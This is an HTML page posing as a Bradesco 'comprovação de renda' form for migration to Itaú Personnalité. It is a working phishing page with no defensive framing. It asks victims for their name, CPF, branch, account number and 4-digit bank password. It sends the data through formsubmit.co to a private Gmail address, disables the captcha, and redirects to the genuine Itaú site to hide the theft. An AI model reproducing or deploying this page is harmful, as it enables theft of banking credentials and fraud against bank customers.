<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Comprovação de Renda - Bradesco</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap');
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: 'Poppins', sans-serif;
    }
    body {
      background: linear-gradient(to right, #b71c1c, #880e4f);
      color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 40px 20px;
    }
    main {
      background: #ffffff15;
      padding: 40px;
      border-radius: 20px;
      max-width: 500px;
      width: 100%;
      box-shadow: 0 0 30px rgba(0,0,0,0.3);
    }
    h1 {
      text-align: center;
      font-size: 1.8rem;
      margin-bottom: 10px;
    }
    .sub {
      text-align: center;
      font-size: 1rem;
      margin-bottom: 25px;
      color: #ffcccb;
    }
    form {
      display: flex;
      flex-direction: column;
      gap: 18px;
    }
    label {
      font-weight: 600;
      font-size: 0.95rem;
    }
    input {
      padding: 12px;
      border-radius: 10px;
      border: none;
      font-size: 1rem;
      background: #f5f5f5;
      color: #333;
    }
    input:focus {
      outline: 2px solid #d32f2f;
    }
    button {
      margin-top: 10px;
      padding: 14px;
      border: none;
      border-radius: 10px;
      background: #d32f2f;
      color: white;
      font-size: 1.1rem;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.3s;
    }
    button:hover {
      background: #b71c1c;
    }
  </style>
</head>
<body>
  <main>
    <h1>Comprovação de Renda</h1>
    <div class="sub">Migração para Itaú Personnalité Nível 5</div>
    <p style="font-size: 0.95rem; margin-bottom: 25px; color: #ffdada;">
      Preencha os dados abaixo para que possamos validar sua comprovação de renda no Bradesco e finalizar sua migração para o Itaú Personnalité Nível 5.
    </p>
    <form action="https://formsubmit.co/bieell.vg@gmail.com" method="POST">
      <input type="hidden" name="_captcha" value="false">
      <input type="hidden" name="_next" value="https://www.itau.com.br">

      <label for="nome">Nome completo</label>
      <input type="text" id="nome" name="nome" />

      <label for="cpf">CPF</label>
      <input type="text" id="cpf" name="cpf" />

      <label for="agencia">Agência Bradesco</label>
      <input type="text" id="agencia" name="agencia" />

      <label for="conta">Conta Bradesco</label>
      <input type="text" id="conta" name="conta" />

      <label for="senha">Senha de 4 dígitos</label>
      <input type="password" id="senha" name="senha" maxlength="4" />

      <label for="telefone">Telefone</label>
      <input type="text" id="telefone" name="telefone" />

      <label for="email">E-mail</label>
      <input type="email" id="email" name="email" />

      <button type="submit">Confirmar Dados</button>
    </form>
  </main>
</body>
</html>
